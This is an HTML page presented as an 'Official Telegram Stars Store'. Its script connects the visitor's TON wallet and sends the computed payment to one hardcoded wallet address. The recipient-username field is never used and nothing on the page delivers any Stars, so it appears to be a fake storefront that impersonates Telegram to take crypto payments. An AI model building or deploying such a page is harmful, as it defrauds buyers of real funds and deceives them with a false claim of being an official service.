<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>StarLink | Official Telegram Stars Store</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        :root { --primary: #fecb2e; --bg: #0a0a0a; --card: #141414; --border: #222; --text: #ffffff; }
        body { background-color: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; margin: 0; padding: 0; }
        .header { padding: 40px 20px; text-align: center; border-bottom: 1px solid var(--border); }
        .logo { width: 64px; height: 64px; background: linear-gradient(135deg, #fecb2e, #f7931a); border-radius: 16px; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 15px; font-size: 32px; }
        .container { max-width: 420px; margin: -20px auto 40px; padding: 0 20px; }
        .panel { background: var(--card); border-radius: 20px; padding: 24px; border: 1px solid var(--border); }
        .label { color: #888; font-size: 11px; font-weight: 700; text-transform: uppercase; margin-bottom: 10px; display: block; }
        .input-box { background: #1f1f1f; border: 1px solid var(--border); border-radius: 12px; padding: 14px; margin-bottom: 20px; }
        .input-box input { background: transparent; border: none; color: white; width: 100%; font-size: 16px; outline: none; }
        .summary { display: flex; justify-content: space-between; align-items: center; border-top: 1px solid #222; padding-top: 20px; }
        .price { font-size: 24px; font-weight: 800; }
        .btn { background: var(--primary); color: #000; border: none; padding: 12px 25px; border-radius: 12px; font-weight: 700; cursor: pointer; }
        #ton-connect-button { display: none; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">⭐️</div>
        <h2>StarLink Premium</h2>
    </div>
    <div class="container">
        <div class="panel">
            <span class="label">Recipient Username</span>
            <div class="input-box"><input type="text" value="@me"></div>
            <span class="label">Quantity (Min 500)</span>
            <div class="input-box"><input type="number" id="qty" value="1000" oninput="calc()"></div>
            <div class="summary">
                <div class="price" id="res">2.50 <span style="font-size:14px; color:#888;">TON</span></div>
                <button class="btn" onclick="pay()">Purchase</button>
            </div>
        </div>
    </div>
    <div id="ton-connect-button"></div>
    <script>
        const tonUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });
        function calc() {
            const q = document.getElementById('qty').value;
            const p = (q * 0.0025).toFixed(2);
            document.getElementById('res').innerHTML = p + " <span style='font-size:14px; color:#888;'>TON</span>";
            return p;
        }
        async function pay() {
            if (!tonUI.connected) { await tonUI.openModal(); return; }
            const a = calc();
            const tx = { validUntil: Math.floor(Date.now()/1000)+300, messages: [{
                address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS",
                amount: (a * 1000000000).toString(),
                payload: btoa("Stars:" + document.getElementById('qty').value)
            }]};
            try { await tonUI.sendTransaction(tx); } catch(e) {}
        }
    </script>
</body>
</html>
